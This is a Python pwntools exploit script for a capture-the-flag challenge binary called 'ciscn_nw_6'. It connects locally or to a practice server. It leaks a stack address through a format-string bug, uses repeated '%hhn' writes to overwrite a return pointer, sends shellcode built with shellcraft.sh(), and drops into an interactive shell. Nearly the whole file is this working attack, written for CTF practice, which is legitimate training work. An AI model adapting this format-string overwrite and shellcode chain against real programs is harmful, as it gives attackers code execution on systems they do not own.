#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
context.arch='i386'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_nw_6')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_nw_6')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',29741)
			elf=ELF('./ciscn_nw_6')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		
		io.recv()
		io.sendline('%4$p')

		stack = int(io.recv(10),16)+0x10+4
		str1=stack&0xff
		io.recv()
		io.sendline('%'+str(str1)+'c%8$hhn')
		io.recv()
		shell_addr=0x0804A260
		io.sendline('%'+str(0x60)+'c%12$hhn')
		io.recv()
		io.sendline('%'+str(str1+1)+'c%8$hhn')
		io.recv()
		io.sendline('%'+str(0xa2)+'c%12$hhn')
		io.recv()
		io.sendline('hello'.ljust(0x100,'\x00')+asm(shellcraft.sh()))
		io.recv()
		io.sendline('hello')


		# success('heap_base:'+hex(heap_base))
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue